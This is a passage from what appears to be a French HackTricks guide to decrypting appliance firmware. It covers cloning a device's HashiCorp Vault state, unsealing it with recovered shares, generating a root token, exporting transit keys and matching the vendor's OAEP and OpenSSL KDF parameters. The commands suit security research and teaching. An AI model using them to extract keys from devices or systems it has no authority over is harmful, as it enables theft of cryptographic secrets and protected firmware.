- Recherchez dans le système de fichiers racine extrait l’état KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), ainsi que les fichiers d’unité et les scripts d’initialisation.
- Considérez les commandes `vault operator unseal ...` en clair, les clés de récupération, les jetons d’initialisation ou les scripts locaux d’auto-déverrouillage KMS comme équivalents à du matériel de clé privée.

Si l’appliance inclut le binaire Vault d’origine et le backend de stockage, reproduire cet environnement est généralement plus facile que de réimplémenter les mécanismes internes de Vault :

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Avec les droits root sur le KMS cloné :

- Rendez les clés transit exportables uniquement dans le clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exportez la clé de déballage : `vault read transit/export/encryption-key/<name>`
- Essayez la clé RSA récupérée avec la paire padding/hash exacte utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne prouvent **pas** que la clé est incorrecte ; de nombreux flux basés sur Vault utilisent OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si la charge utile commence par `Salted__`, reproduisez exactement le KDF OpenSSL du fournisseur (`EVP_BytesToKey`, souvent MD5 sur les anciens appareils) avant de tenter le déchiffrement AES-CBC.

Cela transforme le problème du « firmware chiffré » en un problème plus général : **récupérer les clés opérationnelles côté appareil, puis reproduire hors ligne les paramètres exacts de déballage et du KDF**.

## Formation et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craquer un firmware avec Claude : compétences de niveau senior, autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de test de sécurité des firmwares](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking : le guide définitif pour attaquer l’Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiter des zero-days dans du matériel abandonné – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m’a donné accès à votre domicile](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Vous voyez maintenant mi : vous êtes maintenant pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiter le Tesla Wall Connector depuis son connecteur de port de charge - Partie 2 : contourner la protection contre les rétrogradations](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faites-le clignoter : exploitation par voie hertzienne du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
